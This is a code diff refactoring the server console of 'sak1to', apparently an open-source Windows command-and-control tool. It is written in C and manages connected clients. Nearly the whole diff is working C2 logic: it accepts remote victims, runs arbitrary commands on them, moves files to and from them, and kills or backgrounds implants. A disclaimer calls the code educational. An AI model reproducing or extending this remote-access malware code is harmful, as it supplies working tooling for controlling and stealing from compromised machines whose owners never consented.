@@ -17,7 +17,7 @@ Use this code educationally/legally.
 
 // Function to close specified socket.
 void terminate_server(SOCKET socket, const char* const error) {
-	int err_code = 0;
+	int err_code = EXIT_SUCCESS;
 	if (error) {
 		fprintf(stderr, "%s: ld\n", error, WSAGetLastError());
 		err_code = 1;
@@ -69,42 +69,42 @@ void bind_socket(const SOCKET listen_socket) {
 		terminate_server(listen_socket, "An error occured while placing the socket in listening state");
 }
 
-void add_client(Conn_map* conns, char* const host, SOCKET client_socket) {
-	// If delete_client() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
-	WaitForSingleObject(conns->ghMutex, INFINITE);
+void add_client(Server_map* s_map, char* const host, SOCKET client_socket) {
+	// If delete_client() is executing: wait for it to finish modifying s_map->clients to prevent race conditions from occurring.
+	WaitForSingleObject(s_map->ghMutex, INFINITE);
 
-	if (conns->size == conns->alloc)
-		conns->clients = realloc(conns->clients, (conns->alloc += MEM_CHUNK) * sizeof(Conn));
+	if (s_map->size == s_map->alloc)
+		s_map->clients = realloc(s_map->clients, (s_map->alloc += MEM_CHUNK) * sizeof(Conn));
 
 	// Add hostname string and client_socket object to Conn structure.
-	conns->clients[conns->size].host = host;
-	conns->clients[conns->size].sock = client_socket;
-	conns->size++;
+	s_map->clients[s_map->size].host = host;
+	s_map->clients[s_map->size].sock = client_socket;
+	s_map->size++;
 
 	// Release our mutex now.
-	ReleaseMutex(conns->ghMutex);
+	ReleaseMutex(s_map->ghMutex);
 }
 
 // Thread to recursively accept connections.
 DWORD WINAPI accept_conns(LPVOID* lp_param) {
 	// Assign member values to connection map object/structure.
-	Conn_map* conns = (Conn_map*)lp_param;
-	conns->alloc = MEM_CHUNK;
-	conns->size = 0;
-	conns->clients = malloc(conns->alloc * sizeof(Conn));
-	conns->listen_socket = create_socket();
+	Server_map* s_map = (Server_map*)lp_param;
+	s_map->alloc = MEM_CHUNK;
+	s_map->size = 0;
+	s_map->clients = malloc(s_map->alloc * sizeof(Conn));
+	s_map->listen_socket = create_socket();
 
 	// Bind socket to port.
-	bind_socket(conns->listen_socket);
+	bind_socket(s_map->listen_socket);
 
 	while (1) {
 		struct sockaddr_in client;
 		int c_size = sizeof(client);
 
 		// Client socket object.
-		const SOCKET client_socket = accept(conns->listen_socket, (struct sockaddr*)&client, &c_size);
+		const SOCKET client_socket = accept(s_map->listen_socket, (struct sockaddr*)&client, &c_size);
 		if (client_socket == INVALID_SOCKET)
-			terminate_server(conns->listen_socket, "Error accepting client connection");
+			terminate_server(s_map->listen_socket, "Error accepting client connection");
 
 		// Client's remote name and port.
 		char host[NI_MAXHOST] = { 0 };
@@ -118,14 +118,28 @@ DWORD WINAPI accept_conns(LPVOID* lp_param) {
 			printf("%s connected on port %hu\n", host, ntohs(client.sin_port));
 		}
 
-		// Add client oriented data to conns object.
-		add_client(conns, host, client_socket);
+		// Add client oriented data to s_map object.
+		add_client(s_map, host, client_socket);
 	}
-	return -1;
+
+	return FAILURE;
 }
 
 // Wrapper function for sending file to client (TCP file transfer).
 int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// Open file with read permissions.
+	HANDLE h_file = sakito_win_openf(buf+8, GENERIC_READ, OPEN_EXISTING);
+
+	// If file doesn't exist.
+	if (h_file == INVALID_HANDLE_VALUE) {
+		puts("File not found or permission denied.\n");
+		// Send '6' control code to client to force client to re-receive command.
+		if (send(client_socket, "6", 1, 0) < 1)
+			return SOCKET_ERROR;
+
+		return FILE_NOT_FOUND;
+	}
+
 	// '3' is the command code for uploading a file via the client.
 	buf[7] = '3';
 
@@ -133,16 +147,11 @@ int send_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	if (send(client_socket, buf+7, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
+	// Receive file transfer start byte to prevent received data from overlapping.
+	if (recv(client_socket, buf, 1, 0) < 1)
+		return SOCKET_ERROR;
+
 	int32_t f_size = 0;
-
-	// Open file with read permissions.
-	HANDLE h_file = sakito_win_openf(buf+8, GENERIC_READ, OPEN_EXISTING);
-
-	// If file doesn't exist.
-	if (h_file == INVALID_HANDLE_VALUE) {
-		puts("File not found.\n");
-		return FILE_NOT_FOUND;
-	}
 
 	// Get file size and serialize file size bytes.
 	LARGE_INTEGER largeint_struct;
@@ -162,36 +171,50 @@ int recv_file(char* const buf, const size_t cmd_len, const SOCKET client_socket)
 	if (send(client_socket, buf+9, cmd_len, 0) < 1)
 		return SOCKET_ERROR;
 
-	HANDLE h_file = sakito_win_openf(buf+10, GENERIC_WRITE, CREATE_ALWAYS);
-
-	// Receive file size.
-	if (recv(client_socket, buf, sizeof(uint32_t), 0) < 1)
+	// Receive serialized file size int32_t bytes.
+	if (recv(client_socket, buf, sizeof(int32_t), 0) < 1)
 		return SOCKET_ERROR;
 
 	// Deserialize f_size.
-	uint32_t f_size = ntohl_conv(&*(buf));
+	int32_t f_size = ntohl_conv(&*(buf));
 
-	if (f_size > 0)
-		// Windows TCP file transfer (recv) function located in sakito_tools.h.
-		int i_result = sakito_win_recvf(h_file, client_socket, buf, f_size);
-	else if (f_size == -1)
+	int i_result = SUCCESS;
+
+	if (f_size != FAILURE) {
+		HANDLE h_file = sakito_win_openf(buf+10, GENERIC_WRITE, CREATE_ALWAYS);
+		if (f_size > 0)
+			// Windows TCP file transfer (recv) function located in sakito_tools.h.
+			i_result = sakito_win_recvf(h_file, client_socket, buf, f_size);
+		if (h_file != INVALID_HANDLE_VALUE)
+			CloseHandle(h_file);
+	}
+	else {
 		puts("The client's system cannot find the file specified.\n");
+	}
 
-	CloseHandle(h_file);
+	// Send file_complete byte.
+	if (send(client_socket, FTRANSFER_FINISHED, 1, 0) < 1)
+		return FAILURE;
 
 	return i_result;
 }
 
 // Function send change directory command to client.
-int client_cd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
-	// '1' is the command code for changing directory via the client.
+int client_chdir(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+	// '1' is the command code for changing directory.
 	buf[3] = '1';
 	
-	// Send command code + directory to be parsed.
-	if (send(client_socket, buf+3, cmd_len, 0) < 1)
-		return SOCKET_ERROR;
+	// Send command code + directory string to be parsed.
+	if (send(client_socket, buf+3, BUFLEN, 0) < 1)
+		return FAILURE;
 
-	return 1;
+	if (recv(client_socket, buf, 1, 0) < 1)
+		return FAILURE;
+
+	if (buf[0] == '0')
+		puts("The client's system cannot find the path specified.\n");
+ 
+	return SUCCESS;
 }
 
 // Function to terminate/kill client.
@@ -199,22 +222,33 @@ int terminate_client(char* const buf, const size_t cmd_len, const SOCKET client_
 	// '2' is the command code for terminating/killing the process on the client.
 	send(client_socket, "2", cmd_len, 0);
 
-	return 0;
+	return EXIT_SUCCESS;
+}
+
+// Function to terminate/kill client.
+int background_client(char* const buf, const size_t cmd_len, SOCKET client_socket) {
+	// '5' is the command code for backgrounding the client.
+	if (send(client_socket, "5", 1, 0) < 1)
+		return SOCKET_ERROR;
+	return BACKGROUND_CLIENT;
 }
 
 // Function to send command to client.
 int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) {
+	// '0' Is the command code for executing a command via CreateProcess.
+	buf[0] = '0';
+
 	// Send command to server.
 	if (send(client_socket, buf, cmd_len, 0) < 1)
-		return -1;
+		return FAILURE;
 
 	// Initialize i_result to true.
-	int i_result = 1;
+	int i_result = SUCCESS;
 
 	// Receive command output stream and write output chunks to stdout.
 	do {
 		i_result = recv(client_socket, buf, BUFLEN, 0);
-		if (detect_eos(i_result, buf))
+		if (buf[0] == *EOS)
 			break;
 		fwrite(buf, 1, i_result, stdout);
 	} while (i_result > 0);
@@ -225,146 +259,153 @@ int send_cmd(char* const buf, const size_t cmd_len, const SOCKET client_socket) 
 	return i_result;
 }
 
-// Function to return function pointer based on parsed command.
-const func parse_cmd(char* const buf) {
-	// Array of command strings to parse stdin with.
-	const char commands[4][10] = { "cd ", "exit", "upload ", "download " };
+// Function to resize s_map array/remove and close connection.
+void delete_client(Server_map* s_map, const int client_id) {
+	// If accept_conns() is executing: wait for it to finish modifying s_map->clients to prevent race conditions from occurring.
+	WaitForSingleObject(s_map->ghMutex, INFINITE);
 
-	// Function pointer array of each c2 command.
-	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file };
-
-	for (int i = 0; i < 4; i++)
-		if (compare(buf, commands[i]))
-			return func_array[i];
-
-	// If no command was parsed: send/execute the command string on the client via _popen().
-	return &send_cmd;
-}
-
-// Function to resize conns array/remove and close connection.
-void delete_client(Conn_map* conns, const int client_id) {
-	// If accept_conns() is executing: wait for it to finish modifying conns->clients to prevent race conditions from occurring.
-	WaitForSingleObject(conns->ghMutex, INFINITE);
-
-	if (conns->clients[client_id].sock)
-		closesocket(conns->clients[client_id].sock);
+	if (s_map->clients[client_id].sock)
+		closesocket(s_map->clients[client_id].sock);
 
 	// If there's more than one connection: resize the clients structure member values.
-	if (conns->size > 1) {
-		int max_index = conns->size-1;
+	if (s_map->size > 1) {
+		int max_index = s_map->size-1;
 		for (size_t i = client_id; i < max_index; i++) {
-			conns->clients[i].sock = conns->clients[i + 1].sock;
-			conns->clients[i].host = conns->clients[i + 1].host;
+			s_map->clients[i].sock = s_map->clients[i + 1].sock;
+			s_map->clients[i].host = s_map->clients[i + 1].host;
 		}
-		conns->clients[max_index].sock = 0;
-		conns->clients[max_index].host = NULL;
+		s_map->clients[max_index].sock = 0;
+		s_map->clients[max_index].host = NULL;
 	}
 
-	conns->size--;
+	s_map->size--;
 
 	// Release our mutex now - so accept_conns() can continue execution.
-	ReleaseMutex(conns->ghMutex);
+	ReleaseMutex(s_map->ghMutex);
+}
+
+int validate_id(Server_map* s_map) {
+	int client_id;
+	client_id = atoi(s_map->buf+9);
+	if (!s_map->size || client_id < 0 || client_id > s_map->size - 1)
+		return FAILURE;
+	else
+		return client_id;
 }
 
 // Function to parse interactive input and send to specified client.
-void interact(Conn_map* conns, char* const buf, const int client_id) {
-	const SOCKET client_socket = conns->clients[client_id].sock;
-	char* client_host = conns->clients[client_id].host;
+void interact(Server_map* s_map) {
+	int client_id = validate_id(s_map);
 
-	// Initialize i_result to true.
-	int i_result = 1;
+	if (client_id == -1) {
+		puts("Invalid client identifier.");
+		return;
+	}
+
+	// Send initialization byte to client.
+	int i_result = send(s_map->clients[client_id].sock, INIT_CONN, 1, 0);
 
 	// Receive and parse input/send commands to client.
 	while (i_result > 0) {
-		printf("%s // ", client_host);
+		// Receive current working directory.
+		if (recv(s_map->clients[client_id].sock, s_map->buf, BUFLEN, 0) < 1)
+			break;
+
+		printf("%d-(%s)-%s>", client_id, s_map->clients[client_id].host, s_map->buf);
 	
 		// Set all bytes in buffer to zero.
-		memset(buf, '\0', BUFLEN);
+		memset(s_map->buf, '\0', BUFLEN);
 
-		buf[0] = '0';
-		size_t cmd_len = get_line(buf+1) + 1;
-		char* cmd = buf+1;
+		// Array of command strings to parse stdin with.
+		const char commands[5][11] = { "cd ", "exit", "upload ", "download ", "background" };
 
-		if (cmd_len > 1) {
-			if (compare(cmd, "background")) {
-				return;
-			}
-			else {
-				// If a command is parsed call its corresponding function else execute-
-				// the command on the client.
-				const func target_func = parse_cmd(cmd);
-				i_result = target_func(buf, cmd_len, client_socket);
-			}
-		}
+		// Function pointer array of each c2 command.
+		void* func_array[5] = { &client_chdir, &terminate_client, &send_file, &recv_file, &background_client};
+
+		// Parse and execute command function
+		size_t cmd_len = 0;
+		const server_func target_func = (const server_func)parse_cmd(s_map->buf+1,
+									&cmd_len,
+									5,
+									commands,
+									func_array,
+									&send_cmd);
+
+		i_result = target_func(s_map->buf, cmd_len+1, s_map->clients[client_id].sock);
+
+		if (i_result == BACKGROUND)
+			return;
 	}
 
 	// If client disconnected/exit command is parsed: delete the connection.
-	delete_client(conns, client_id);
-	printf("Client: \"%s\" disconnected.\n\n", client_host);
+	delete_client(s_map, client_id);
+	printf("Client: \"%s\" disconnected.\n\n", s_map->clients[client_id].host);
 }
 
-void terminate_console(HANDLE acp_thread, Conn_map conns) {
+void host_chdir(Server_map* s_map) {
+	chdir(s_map->buf);
+}
+
+void terminate_console(Server_map* s_map) {
 	// Quit accepting connections.
-	TerminateThread(acp_thread, 0);
+	TerminateThread(s_map->acp_thread, 0);
 
 	// if there's any connections close them before exiting.
-	if (conns.size) {
-		for (size_t i = 0; i < conns.size; i++)
-			closesocket(conns.clients[i].sock);
+	if (s_map->size) {
+		for (size_t i = 0; i < s_map->size; i++)
+			closesocket(s_map->clients[i].sock);
 		// Free allocated memory.
-		free(conns.clients);
+		free(s_map->clients);
 	}
-	terminate_server(conns.listen_socket, NULL);
+	terminate_server(s_map->listen_socket, NULL);
 }
 
-void validate_id(char* const buf, Conn_map conns) {
-	int client_id;
-	client_id = atoi(buf+9);
-	if (!conns.size || client_id < 0 || client_id > conns.size - 1)
-		printf("Invalid client identifier.\n");
-	else
-		interact(&conns, buf, client_id);
-}
-
-void exec_cmd(char* const buf) {
-	sakito_win_cp((SOCKET)NULL, buf);
+void exec_cmd(Server_map* s_map) {
+	sakito_win_cp((SOCKET)NULL, s_map->buf);
 	fputc('\n', stdout);
+}
+
+void sakito_console(Server_map *s_map) {
+	// Saktio console loop.
+	while (1) {
+		printf("sak1to-console // ");
+
+		// Set all bytes in buffer to zero.
+		memset(s_map->buf, '\0', BUFLEN+1);
+
+
+		// Array of command strings to parse stdin with.
+		const char commands[4][11] = { "cd ", "exit", "list", "interact " };
+
+		// Function pointer array of each c2 command.
+		void* func_array[4] = { &host_chdir, &terminate_console, &list_connections, &interact};
+
+		// Parse and execute command function.
+		size_t cmd_len = 0;
+		const console_func target_func = (const console_func)parse_cmd(s_map->buf,
+									 &cmd_len,
+									 4,
+									 commands,
+									 func_array,
+									 &exec_cmd);
+
+		target_func(s_map);
+	}
 }
 
 // Main function for parsing console input and calling sakito-console functions.
 int main(void) {
-	Conn_map conns;
-	conns.ghMutex = CreateMutex(NULL, FALSE, NULL);
+	// Instantiate a Server_map structure.
+	Server_map s_map;
 
-	HANDLE acp_thread = CreateThread(0, 0, accept_conns, &conns, 0, 0);
-	HANDLE  hColor;
-	hColor = GetStdHandle(STD_OUTPUT_HANDLE);
-	SetConsoleTextAttribute(hColor, 9);
+	// Mutex lock for preventing race conditions.
+	s_map.ghMutex = CreateMutex(NULL, FALSE, NULL);
 
-	while (1) {
-		printf("sak1to-console // ");
-	
-		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
-		char buf[BUFLEN + 1] = { 0 };
-		size_t cmd_len = get_line(buf);
+	// Begin accepting connections.
+	s_map.acp_thread = CreateThread(0, 0, accept_conns, &s_map, 0, 0);
 
-		if (cmd_len > 1)
-			if (compare(buf, "exit"))
-				// Terminate console application and server.
-				terminate_console(acp_thread, conns);
-			else if (compare(buf, "cd "))
-				// Change directory on host system.
-				_chdir(buf+3);
-			else if (compare(buf, "list"))
-				// List all connections.
-				list_connections(&conns);
-			else if (compare(buf, "interact "))
-				// If ID is valid interact with client.
-				validate_id(buf, conns);
-			else
-				// Execute command on host system.
-				exec_cmd(buf);
-	}
+	// Initiate sakito console.
+	sakito_console(&s_map);
 
-	return -1;
+	return FAILURE;
 }
